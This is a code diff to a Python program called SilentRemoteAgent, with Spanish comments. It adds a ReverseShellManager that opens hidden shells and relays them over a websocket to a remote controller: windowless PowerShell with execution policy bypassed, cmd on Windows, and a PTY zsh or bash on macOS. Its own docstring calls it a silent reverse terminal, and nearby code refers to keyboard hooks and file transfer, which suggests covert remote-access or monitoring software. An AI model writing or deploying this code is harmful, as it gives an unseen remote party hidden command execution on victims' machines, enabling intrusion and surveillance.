@@ -1282,6 +1282,171 @@ class KeyboardEventHook:
                 self._listener = None
 
 
+class ReverseShellManager:
+    """MF-SH01/SH02/SH03: Terminal inversa silenciosa sobre wss:// (PTY en macOS, PowerShell/CMD oculto en Windows)."""
+
+    def __init__(self, on_output: Callable[[str, str, bool], None]):
+        self.on_output = on_output
+        self._sessions: Dict[str, dict] = {}
+        self._lock = threading.Lock()
+
+    def open_session(self, session_key: str, shell_type: str = "auto", cols: int = 110, rows: int = 32) -> str:
+        self.close_session(session_key)
+        home_dir = str(Path.home())
+        env = dict(os.environ)
+        env.setdefault("TERM", "xterm-256color")
+        env.setdefault("LANG", "en_US.UTF-8")
+
+        if IS_WINDOWS:
+            no_win = getattr(subprocess, "CREATE_NO_WINDOW", 0x08000000)
+            use_cmd = str(shell_type).lower() == "cmd"
+            cmd_args = (
+                ["cmd.exe", "/Q", "/K", "chcp 65001 >nul"]
+                if use_cmd
+                else [
+                    "powershell.exe", "-NoLogo", "-NoExit", "-ExecutionPolicy", "Bypass",
+                    "-Command", "[Console]::OutputEncoding=[System.Text.Encoding]::UTF8; [Console]::InputEncoding=[System.Text.Encoding]::UTF8; Write-Output ('PS ' + (Get-Location).Path + '> ')"
+                ]
+            )
+            proc = subprocess.Popen(
+                cmd_args, cwd=home_dir, env=env, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT, bufsize=0, creationflags=no_win,
+            )
+            sess = {"proc": proc, "master_fd": None, "kind": "cmd" if use_cmd else "powershell", "alive": True}
+            with self._lock:
+                self._sessions[session_key] = sess
+            threading.Thread(target=self._win_reader, args=(session_key, proc), daemon=True).start()
+            return "CMD (Windows)" if use_cmd else "PowerShell (Windows)"
+
+        import fcntl
+        import pty
+        import signal
+        import termios
+        sh_bin = "/bin/zsh" if os.path.exists("/bin/zsh") else "/bin/bash"
+        env["PROMPT_EOL_MARK"] = ""
+        if sh_bin.endswith("zsh"):
+            env.setdefault("PS1", "%n@%m %1~ %# ")
+        sh_args = [sh_bin, "-f", "-i"] if sh_bin.endswith("zsh") else [sh_bin, "--norc", "-i"]
+        master_fd, slave_fd = pty.openpty()
+        try:
+            fcntl.ioctl(slave_fd, termios.TIOCSWINSZ, struct.pack("HHHH", max(12, rows), max(40, cols), 0, 0))
+        except Exception:
+            pass
+
+        def _setup_ctty():
+            os.setsid()
+            try:
+                fcntl.ioctl(0, termios.TIOCSCTTY, 0)
+            except Exception:
+                pass
+
+        proc = subprocess.Popen(
+            sh_args, cwd=home_dir, env=env, stdin=slave_fd, stdout=slave_fd, stderr=slave_fd,
+            preexec_fn=_setup_ctty, close_fds=True,
+        )
+        os.close(slave_fd)
+        sess = {"proc": proc, "master_fd": master_fd, "kind": os.path.basename(sh_bin), "alive": True}
+        with self._lock:
+            self._sessions[session_key] = sess
+        threading.Thread(target=self._pty_reader, args=(session_key, master_fd, proc), daemon=True).start()
+        return f"{os.path.basename(sh_bin)} (PTY macOS)"
+
+    def _pty_reader(self, session_key: str, master_fd: int, proc: subprocess.Popen):
+        try:
+            while True:
+                chunk = os.read(master_fd, 4096)
+                if not chunk:
+                    break
+                self.on_output(session_key, chunk.decode("utf-8", errors="replace"), False)
+        except Exception:
+            pass
+        finally:
+            self.on_output(session_key, "\r\n[Sesion de terminal finalizada]\r\n", True)
+            self.close_session(session_key)
+
+    def _win_reader(self, session_key: str, proc: subprocess.Popen):
+        try:
+            out_pipe = proc.stdout
+            fd = out_pipe.fileno() if out_pipe else -1
+            while fd >= 0:
+                chunk = os.read(fd, 4096)
+                if not chunk:
+                    break
+                self.on_output(session_key, chunk.decode("utf-8", errors="replace"), False)
+        except Exception:
+            pass
+        finally:
+            self.on_output(session_key, "\r\n[Sesion de terminal finalizada]\r\n", True)
+            self.close_session(session_key)
+
+    def write_input(self, session_key: str, data_str: str):
+        with self._lock:
+            sess = self._sessions.get(session_key)
+        if not sess:
+            return
+        try:
+            if sess["master_fd"] is not None:
+                os.write(sess["master_fd"], data_str.encode("utf-8", errors="replace"))
+            elif sess["proc"].stdin:
+                cmd_line = data_str if data_str.endswith("\n") else (data_str + "\n")
+                if sess["kind"] == "powershell":
+                    cmd_line = cmd_line.rstrip("\r\n") + "\r\nWrite-Output ('PS ' + (Get-Location).Path + '> ')\r\n"
+                sess["proc"].stdin.write(cmd_line.encode("utf-8", errors="replace"))
+                sess["proc"].stdin.flush()
+        except Exception:
+            self.close_session(session_key)
+
+    def interrupt(self, session_key: str):
+        with self._lock:
+            sess = self._sessions.get(session_key)
+        if not sess:
+            return
+        try:
+            if sess["master_fd"] is not None:
+                os.write(sess["master_fd"], b"\x03")
+            elif IS_WINDOWS:
+                kind = sess["kind"]
+                self.close_session(session_key)
+                lbl = self.open_session(session_key, shell_type=kind)
+                self.on_output(session_key, f"\r\n[Proceso interrumpido (Ctrl+C) — {lbl} reiniciado]\r\n", False)
+        except Exception:
+            pass
+
+    def close_session(self, session_key: str):
+        with self._lock:
+            sess = self._sessions.pop(session_key, None)
+        if not sess:
+            return
+        proc = sess.get("proc")
+        if proc and proc.poll() is None:
+            try:
+                if IS_WINDOWS:
+                    no_win = getattr(subprocess, "CREATE_NO_WINDOW", 0x08000000)
+                    subprocess.run(["taskkill", "/F", "/T", "/PID", str(proc.pid)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=no_win)
+                else:
+                    import signal
+                    try:
+                        os.killpg(proc.pid, signal.SIGHUP)
+                    except Exception:
+                        pass
+                    proc.kill()
+                proc.wait(timeout=0.5)
+            except Exception:
+                pass
+        mfd = sess.get("master_fd")
+        if mfd is not None:
+            try:
+                os.close(mfd)
+            except Exception:
+                pass
+
+    def close_all(self):
+        with self._lock:
+            keys = list(self._sessions.keys())
+        for k in keys:
+            self.close_session(k)
+
+
 class SilentRemoteAgent:
     def __init__(self, cfg: dict):
         self.cfg = cfg
@@ -1329,6 +1494,7 @@ class SilentRemoteAgent:
         self.loop: Optional[asyncio.AbstractEventLoop] = None
         self.audio_player = AudioPlayerWorker()
         self.chat_popup = PopupChatManager(self._on_user_chat_reply)
+        self.shell_mgr = ReverseShellManager(self._on_shell_output)
 
         # Auditoría de teclado y evidencia visual con regla de 15 segundos (MF-01 a MF-06)
         self.keyboard_hook: Optional[KeyboardEventHook] = None
@@ -1569,6 +1735,11 @@ class SilentRemoteAgent:
             asyncio.run_coroutine_threadsafe(self._send_or_vault_event(payload), self.loop)
         else:
             self._save_to_sitai_vault(payload)
+
+    def _on_shell_output(self, session_key: str, text_chunk: str, closed: bool = False):
+        if self.loop and self.ws:
+            payload = json.dumps({"type": "shell_output", "session_key": session_key, "data": text_chunk, "closed": closed})
+            asyncio.run_coroutine_threadsafe(self._safe_ws_send(payload), self.loop)
 
     def _on_user_chat_reply(self, text: str):
         if self.loop and self.ws:
@@ -2415,6 +2586,23 @@ class SilentRemoteAgent:
                                 elif mtype == "file_transfer":
                                     ack = self.handle_file_transfer(data)
                                     await ws.send(json.dumps(ack))
+                                elif mtype == "shell_open":
+                                    s_key = str(data.get("session_key") or "default")[:48]
+                                    s_type = str(data.get("shell_type") or "auto")[:20]
+                                    try:
+                                        sh_lbl = self.shell_mgr.open_session(s_key, shell_type=s_type)
+                                        await ws.send(json.dumps({"type": "shell_ready", "session_key": s_key, "shell_label": sh_lbl}))
+                                    except Exception as sh_err:
+                                        await ws.send(json.dumps({"type": "shell_output", "session_key": s_key, "data": f"Error al iniciar terminal: {sh_err}\r\n", "closed": True}))
+                                elif mtype == "shell_input":
+                                    s_key = str(data.get("session_key") or "default")[:48]
+                                    self.shell_mgr.write_input(s_key, str(data.get("data") or ""))
+                                elif mtype == "shell_interrupt":
+                                    s_key = str(data.get("session_key") or "default")[:48]
+                                    self.shell_mgr.interrupt(s_key)
+                                elif mtype == "shell_close":
+                                    s_key = str(data.get("session_key") or "default")[:48]
+                                    self.shell_mgr.close_session(s_key)
                                 elif mtype == "sitai_ack":
                                     ack_fname = os.path.basename(str(data.get("filename") or "")).strip()
                                     if ack_fname and ack_fname.endswith(".sitai"):
@@ -2430,6 +2618,7 @@ class SilentRemoteAgent:
                                     await ws.send(json.dumps({"type": "pong"}))
                     finally:
                         stream_task.cancel()
+                        self.shell_mgr.close_all()
                         self.ws = None
                         self.streaming = False
 
